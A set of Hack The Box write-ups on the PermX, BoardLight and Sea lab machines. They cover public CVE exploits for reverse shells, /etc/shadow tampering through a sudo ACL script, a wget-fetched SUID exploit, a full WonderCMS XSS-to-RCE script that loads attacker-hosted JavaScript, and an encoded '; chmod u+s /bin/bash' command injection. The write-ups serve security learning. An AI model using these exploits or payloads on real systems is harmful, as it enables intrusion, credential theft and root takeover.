# Miscellaneous 5

## HTB "PermX" retrospective

This is a retrospective on the HTB Linux box named "PermX." While the machine appears easy on paper, escalating privileges turned out to be quite finicky (more on that later). As usual, I began with an Nmap scan, which revealed two open ports: 22 (SSH) and 80 (HTTP). After enumerating the web application, I couldn't find any obvious paths for exploitation, so I decided to dig deeper. My next step was to search for hidden subdomains. A good list for this is SecLists's subdomain wordlist located at ```/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt```.

Eventually, I uncovered a subdomain: ```lms.permx.htb```, which led to a Chamilo LMS site. Attemps to login using default credentials were fruitless. In the end this turned out to have a publicly documented vulnerability (CVE-2023-4220). I found a working exploit on GitHub that was ready to deploy: [Chamilo LMS Unauthenticated Big Upload RCE PoC](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc). The final command needed to execute the exploit goes like this:

```
python3 main.py -u http://lms.permx.htb -a revshell
```

After obtaining a reverse shell, my next step was to grab the user flag. However, the shell was running as "www-data," and I encountered a "permission denied" error when attempting to access the flag. While enumerating files under ```/var/www/chamilo/```, I came across an interesting file named ```configuration.php```. Upon inspection, this file revealed plaintext credentials, including a password and the username "chamilo." Initially, I attempted to SSH into the machine using these credentials, but was unsuccessful.

After exploring the home directory, I noticed a user named "mtz." With nothing to lose, I tried logging in via SSH with the "mtz" username and the previously discovered password—and it worked. This granted me access and allowed me to retrieve the user flag.

At this point, it's worth mentioning that the LinPEAS tool is incredibly useful during any stage of post-exploitation. It can help track users, find plaintext credentials in config files, and much more. However, manual enumeration using common commands like ```sudo -l``` can sometimes uncover valuable information—just like in this case. Running ```sudo -l``` revealed the following:

```
User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

It turns out that the user "mtz" has permission to run the script ```/opt/acl.sh``` as root. Let's take a closer look at this script.

```
#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

# Assign input arguments to variables
user="$1"
perm="$2"
target="$3"

# Validate that the target file is within the /home/mtz directory and prevent path traversal
if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the target is a valid file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

# Set the access control list (ACL) permissions for the target file
/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

Obviously, the script begins with a shebang (```#!/bin/bash```), which tells the system to run the script using the Bash shell. Next, we have this:

```
if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi
```

So, the script expects exactly three arguments: the user, the permissions, and the target file. If there are not exactly three arguments, it prints a usage message and exits with an error (```exit 1```). The ```$#``` variable holds the number of arguments passed to the script, while ```$0``` holds the script's name. The next part is this:

```
user="$1"
perm="$2"
target="$3"
```

The script assigns the three arguments to variables for easier reference. Here, ```$1``` is assigned to user, ```$2``` is assigned to perm (permissions), and ```$3``` is assigned to target (the file path). Moving on to the next section:

```
if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi
```

This condition ensures that the target file is located within the ```/home/mtz``` directory and does not contain any relative path traversal (```..```) sequences. This is an important security check to prevent users from gaining access to files outside of the intended directory. If either condition fails, the script prints "Access denied." and exits. However, I would like this opportunity to delve a bit deeper into some specifics. For example, this line here:

```
if [[ "$target" != /home/mtz/* || "$target" == *..* ]];
```

Here is what is happening in greater detail:

Double square brackets ```[[ ... ]]```: This is a conditional expression in Bash. It’s used to evaluate more complex conditions safely, especially when handling string operations like pattern matching (what's happening here).

```"$target" != /home/mtz/*```: This part checks if the ```$target``` file path does not start with ```/home/mtz/```. The asterisk ```*``` is a wildcard, so it matches anything within that directory. Essentially, this is saying: "If ```$target``` is not inside the ```/home/mtz/``` directory, then the condition is true."

```||```: This is a logical OR operator. If either the left or the right condition is true, the whole statement becomes true. In this case, either the target is outside ```/home/mtz/```, or it contains ```..``` (indicating possible path traversal).

```"$target" == *..*```: This part checks if the ```$target``` contains ```..``` anywhere in the path. The ```..``` in a file path typically means "go up one directory," so this part of the condition is preventing path traversal attacks. For example, if someone tried to set ```$target``` as ```/home/mtz/../../etc/passwd```, the script would block it, since it could lead to accessing files outside the allowed directory.

The next part of the script is this:

```
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi
```

The script checks if the target is a valid file using ```-f```, which returns true if the file exists and is a regular file. If not, it prints "Target must be a file." and exits. This prevents the script from running on directories or invalid file paths. And finally we have this:

```
/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

The script uses the ```setfacl``` command to modify the Access Control List (ACL) of the target file, setting the specified user (```$user```) and permissions (```$perm```). The ```-m``` flag modifies the ACL, and ```u:``` refers to the user. The command is run with sudo, meaning it has elevated privileges to modify the file's permissions.

On a side note, ```setfacl``` stands for "set file access control list." It is a Linux command used to manage Access Control Lists (ACLs) on files and directories. ACLs are an extended permissions system, allowing you to specify more fine-grained permissions beyond the traditional user/group/other model in Linux. With ACLs, you can assign specific permissions to multiple users or groups for a particular file or directory. The general syntax of the ```setfacl``` command is:

```
setfacl -m u:<user>:<permissions> <file>
```

```-m```: Modify the ACL by adding or changing permissions.

- ```u:<user>```: Specify the user to whom the permissions apply.

- ```<permissions>```: These are the standard permissions like r (read), w (write), and x (execute).

- ```<file>```: The file or directory to which you're applying the ACL.

Let’s say you want to give root full control (read, write, execute) on a file inside ```/home/mtz/```. You would call:

```
sudo /opt/acl.sh root rwx /home/mtz/somefile
```

This would run ```setfacl -m u:root:rwx /home/mtz/somefile```, allowing root to access the file with full permissions, even if root didn't originally have access through the traditional ```chmod``` system.

Overall, ```setfacl``` in this script grants very specific file permissions (like ```rwx```) to any user on files located in ```/home/mtz/```, offering more flexibility and power than the usual ```chmod```. However, since the script can run as root, it's a potential escalation point—especially if you can manipulate or link ```$target``` to sensitive files (like ```/etc/shadow``` as I did later in this example!

Here is a brief summary of everthing so far:

- The script first checks if the correct number of arguments has been passed.

- It assigns those arguments to variables for clarity.

- Then, it validates that the target file is within the ```/home/mtz``` directory and isn't trying to escape the directory through path traversal.

- Next, it checks that the target is a valid file.

- If all checks pass, it uses the ```setfacl``` command with elevated permissions to grant or modify the user's access to the file.

After this digression, the next step involved creating a symbolic link to the ```/etc/shadow``` file, where Linux stores password hashes. This was achieved using the following command:

```
ln -s /etc/shadow /home/mtz/shadow_link
```

This command created a symbolic link (```shadow_link```) inside ```/home/mtz/```, which pointed to ```/etc/shadow```. Essentially, this means that accessing ```shadow_link``` would give us direct access to the actual shadow file, allowing us to interact with it as if it were in ```/home/mtz/```.

Next, I ran the following command to modify permissions on the symbolic link using the ```acl.sh``` script:

```
sudo /opt/acl.sh mtz rw /home/mtz/shadow_link && nano shadow_link
```

This allowed me to open and edit the ```/etc/shadow``` file with root privileges, even though I was operating under the ```mtz``` user. By granting ```rw``` (read and write) permissions on the symbolic link, I was able to modify the shadow file and delete root's password hash. This effectively removed the need for a password for root, enabling passwordless root login.

To verify that everything worked, I checked the contents of the shadow file with the ```cat /etc/shadow``` command. If successful, the root entry should have appeared as follows:

```
root::19742:0:99999:7:::
```

This confirmed that the root password hash had been removed. At this point, issuing the ```su root``` command finally worked, granting me root access and allowing me to grab the root flag.

It’s important to note, though, that this method was somewhat unstable. At times, after running a command or two, the elevated privileges would drop, or the shadow file wouldn't update correctly, making the ```su root``` command unsuccessful. Persistence was key here. Even when everything should theoretically work, unexpected quirks can occur, so understanding the underlying mechanics is crucial instead of simply following the steps blindly.

This example is now concluded.

## HTB "BoardLight" retrospective

This is a retrospective on an HTB Linux box named BoardLight, featuring a relatively easy challenge that involves chaining simple vulnerabilities like insecure default credentials and publicly available exploits.

As usual, I began with a port scan, which revealed two open ports: 22 and 80. Upon checking the web server in my browser, I found a simple static page with nothing out of the ordinary. However, in the "About Us" section, I noticed a reference to the domain ```board.htb```, which I added to my ```/etc/hosts``` file. From there, subdomain enumeration seemed like the next logical step, so I used the ffuf tool to proceed.

```
ffuf -w subdomains-top1million-20000.txt -u http://FUZZ.board.htb -fs 15949
```

Note: ```-fs <size>```: we can specify a single size or multiple sizes separated by commas to filter those specific response sizes from the results.

This scan revealed the subdomain ```crm.board.htb```, which I also added to my ```/etc/hosts``` file. Upon accessing this subdomain, I encountered a Dolibarr web application featuring a login page. Attempting some default credentials turned out to be a successful strategy, as I was able to log in using the admin:admin
combination.

Exploring the admin panel didn’t uncover anything particularly interesting, so my next step was to manually search for known exploits for ```Dolibarr 17.0.0.``` This led me to a [GitHub page](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/tree/main) discussing how to exploit CVE-2023-30253 for this application.

Grabbing this exploit was the next step:

```
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
```

Then I had to set up my ncat listener or port 1234 and pass the following parameters before execution:

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.9 1234
```

Once a shell was established, I began searching for other users. Using the command ```ss -tlnp```, I discovered a MySQL server running on port 3306. An online search revealed some interesting information: *"The Dolibarr configuration file is ```conf/conf.php```, which is created by the automatic installation process."*

After navigating to the specified directory and inspecting the contents of the ```conf.php``` file, I found the cleartext password for the database connection. However, I initially lacked a valid username. Through some trial and error, I eventually discovered that the username ```larissa``` worked with this password, allowing me to SSH into the machine.

As for privilege escalation, I used this command to find out more about the machine:

```
find / -perm -4000 2>/dev/null
```

Note: The ```4000``` is an octal representation of file permissions. The leading ```4``` indicates the setuid (set user ID) permission. When a file has the setuid bit set, it allows a user to execute the file with the permissions of the file's owner, typically granting elevated privileges. Overall, by running this command, a user can identify files with the setuid bit set. If any of these files are exploitable (e.g., if they contain vulnerabilities that can be manipulated), a user can run them to escalate their privileges to the file owner’s level (often root). Suppose the command returns a file like ```/usr/bin/```. If this binary has a known vulnerability, a non-privileged user can exploit it to gain higher privileges.

The output revealed an interesting utility named "enlightenment," which warranted closer inspection.

```
(...)
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backligh
(...)
```

As luck would have it, a [GitHub repository](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) surfaced containing information on CVE-2022-37706 for "enlightenment". After cloning this repository, I was prepared to transfer it to the target machine using a local HTTP server.

```
python3 -m http.server 8000
```

And here is the next step:

```
wget http://10.10.14.9:8000/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

After that I was able to retrieve the root flag and this example is now concluded.

## HTB "Sea" retrospective

This entry reflects on the HTB machine "Sea," which featured a vulnerability in WonderCMS. The journey involved dealing with a malfunctioning exploit, hash cracking, and discovering internal ports that required SSH tunneling for forwarding. Later stages presented a command injection opportunity that I exploited for privilege escalation. Overall, this machine was quite finicky, with tricky enumeration phases, throwing unusual roadblocks and unexpected surprises along the way.

The initial Nmap scan revealed two open ports: 22: OpenSSH and 80: HTTP Apache.

Upon further exploration of the web server, I encountered a bike racing page with a registration form hosted at the following URL: ```http://sea.htb/contact.php```.

This is where I decided to experiment and play with various payloads pointing at my HTTP server. My first attempt involved crafting an XSS payload (to be entered in the URL field in the registration form), but unfortunately, it didn't yield the desired results (URL encoding also didn't help).

```
<script>document.location='http://10.10.14.10:8000';</script>
```

Ultimately, I found that simply taking the URL of my HTTP server, applying URL encoding, and submitting it through the form successfully triggered an action:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [26/Sep/2024 15:29:37] "GET / HTTP/1.1" 200 -
```

What likely happened is the form might be filtering or stripping out JavaScript, but it's still vulnerable to other types of injection where it processes raw URLs directly. By URL encoding your HTTP server's address, I avoided any potential filtering or blocking mechanisms, and the form likely treated it as a legitimate input. Here’s what’s also interesting: the server or the application behind the form processed the encoded URL and issued a GET request to my Python HTTP server without needing JavaScript. It’s possible that this application’s behavior automatically fetches external resources when a URL is submitted. This might suggest the form is vulnerable to Server-Side Request Forgery (SSRF) rather than XSS. In SSRF, we would trick the server into making requests to any URL we control, which is exactly what happened here.

Anyway, I decided to move on and do further enumeration.

```
ffuf -u http://sea.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -recursion -recursion-depth 4
```

This exploration provided valuable insights into what warranted a more thorough investigation. After some detours and aimless wandering, I stumbled upon something intriguing in the ```http://sea.htb/themes/bike/``` directory:

```
css                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 120ms]
img                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 115ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 115ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 111ms]
Reports List            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 112ms]
external files          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 117ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 124ms]
Style Library           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 110ms]
                        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 110ms]
LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 114ms]
```

The "version" file indicated "3.2.0," while the "LICENSE" file mentioned “Turboblack.”

Searching the web with these keywords ultimately led me to the "WonderCMS 3.2.0" exploit (CVE-2023-41425), which is hosted in the following [GitHub repository](https://github.com/prodigiousMind/CVE-2023-41425).

To my surprise, this exploit didn’t work initially, leaving me in the dark for a while. After taking a closer look and researching the exploit, I discovered that some paths needed to be adjusted. Additionally, the exploit was designed to download a specific zip file from GitHub. Since HTB boxes cannot access the internet, I had to download this zip file manually [from the following link](https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip), rename it to "whatever.zip," and place it in the same directory where the modified exploit was executed.

Here is how the fixed exploit looks like:

```
# Exploit: WonderCMS XSS to RCE
import sys
import requests
import os
import bs4
if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
// the server has some issue resolving domain name with JavaScript
// we can just provide the target URL as required parameter
var whateverURL = "http://sea.htb"; 
var token = document.querySelectorAll('[name="token"]')[0].value;
// modify the ZIP file path serving on HTTP server
var urlRev = whateverURL+"/?installModule=http://10.10.14.10:8000/whatever.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   // visit rev.php inside the uploaded ZIP file
   xhr4.open("GET", whateverURL+"/themes/whatever/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       // trigger reverse shell script and provide listner ip & port
       xhr5.open("GET", whateverURL+"/themes/whatever/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")
    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")
```

This can be placed in the original directory (along with the "whatever.zip" file), saved as "exploit2.py," and executed as follows:

```
python3 exploit2.py http://sea.htb/loginURL 10.10.14.10 4444
```

The output should look like this:

```
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 4444
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.10:8000/xss.js"></script><form+action="
----------------------------


starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, we're ready to head over to the contact page at ```http://sea.htb/contact.php``` and submit the link generated by the exploit script. After a few moments, we should see output like this in the HTTP server started by the script:

```
starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [26/Sep/2024 18:02:34] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [26/Sep/2024 18:02:44] "GET /whatever.zip HTTP/1.1" 200 -
10.10.11.28 - - [26/Sep/2024 18:02:44] "GET /whatever.zip HTTP/1.1" 200 -
10.10.11.28 - - [26/Sep/2024 18:02:44] "GET /whatever.zip HTTP/1.1" 200 -
10.10.11.28 - - [26/Sep/2024 18:02:45] "GET /whatever.zip HTTP/1.1" 200 -
```

Next, we need to send a request using Curl with the following link (or alternatively, we can just paste the link into your browser):

```
curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.10&lport=4444'
```

If everything went smoothly, we should receive a reverse shell on the listener we started earlier, as instructed by the script:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

The first command spawns a fully interactive shell, making it easier to work with. The second command ensures the terminal behaves correctly by setting the environment to "xterm."

The next logical step is to search for users with a shell on the machine:

```
cat /etc/passwd | grep 'sh$'
```

In this command, ```grep 'sh$'``` filters the output to show only lines where the shell (e.g., ```/bin/bash```) is listed at the end (```$``` represents the end of a line).

And the output goes like this:

```
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash
```

As we explore other parts of the machine, we come across a ```database.js``` within the web application files that contains a ```bcrypt``` hash.

```
cd /var/www/sea/data
ls
cache.json  database.js  files
cat database.js
```

The line of interest goes like this:

```
"password": "$2y$10$iOr[...].aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```

It's important to clean up the hash, as it contains escape characters (```\```) that would interfere with our cracking attempts.

As for escape characters, they typically appear when special characters within a string need to be represented without breaking the syntax. In the case of hashes, they often occur when a string is exported or displayed in a way that requires certain characters (like quotes or slashes) to be escaped. These characters aren't part of the actual hash and can disrupt cracking tools if not removed.

After cleaning the hash, I echoed it into a text file and used John the Ripper with the "rockyou.txt" wordlist to crack it. This worked perfectly, and now we have the password to SSH into the box as the user "amay."

```
ssh amay@sea.htb
```

The usual privilege escalation checks through crontab, SUID, and sudo permissions didn’t reveal anything useful. So, I moved on to checking open ports on the target. This investigation uncovered two open ports: 8080 and 47739.

```
ss -tlnp
```

Reminder:

- ```-t``` shows only TCP connections.

- ```-l``` lists listening ports.

- ```-n``` disables hostname resolution (speeds up the output by showing numerical addresses).

- ```-p``` displays the processes using those ports.

The next step was to set up SSH tunneling so I could access what was running on port 8080 locally:

```
ssh -L 7777:127.0.0.1:8080 amay@sea.htb -N -f
```

Reminder: In this command, ```-L``` establishes the local port forwarding, ```7777``` is the local port on my machine, ```127.0.0.1:8080``` is the target on the remote machine, ```-N``` tells SSH not to execute any commands (just tunnel), and ```-f``` runs it in the background.

Opening the link http://localhost:7777 in my browser allowed me to view the web application, which seemed to be a system monitoring tool for developers. After exploring the options, the most promising feature was the "analyze log file" option in a drop-down menu. I selected "access.log," decided to capture the request in Burp, and hit the "analyze" button. Here's what appeared:

```
POST / HTTP/1.1
Host: localhost:7777
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:7777
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: close
Referer: http://localhost:7777/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

The key detail here is the ```log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=``` part, which seemed vulnerable to command injection. By sending this request to the Repeater and appending ```; chmod u+s /bin/bash``` to the ```log_file``` parameter, we were able to set the SUID permission on ```/bin/bash```. It's crucial to separate the injected command from the original command, typically using a semicolon (```;```). This ensures the injected command runs as a distinct operation.

Note: Separating commands with a semicolon is important in command injection because it forces the system to treat your input as a new command. To spot similar vulnerabilities in the future, look for input fields or parameters that execute server-side commands, especially if the server interacts with files or logs. Always try appending commands with separators like ```;``` to see if you can execute additional code.

The next step was to URL-encode the payload (```; chmod u+s /bin/bash```) and insert it into the request like this:

```
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log%3b%20%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68&analyze_log=
```

URL encoding replaces special characters with their ASCII codes, ensuring the payload is transmitted correctly without being misinterpreted by the server. This step is crucial in command injection to bypass input validation or filtering. Make sure to properly encode characters like spaces (```%20```) and semicolons (```%3b```) to avoid breaking the syntax of the request.

After this, I sent the modified request through Repeater and ran the following command to confirm the changes:

```
amay@sea:~$ ls /bin/bash -la
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Reminder: The ```rws``` in the permissions means the SUID bit was successfully set on ```/bin/bash```, allowing the file to run with root privileges. This is significant because when you execute ```/bin/bash``` now, it will run as root, granting full system control. The SUID bit essentially lets a user execute a program with the permissions of the file owner, in this case, root.

The final step was to run ```/bin/bash -p``` to retain the elevated privileges from the original owner (root) and apply them to the current session. After that, I confirmed my privilege escalation by running the ```whoami``` command, which returned "root." With that, I was able to capture the root flag and this example is now concluded.
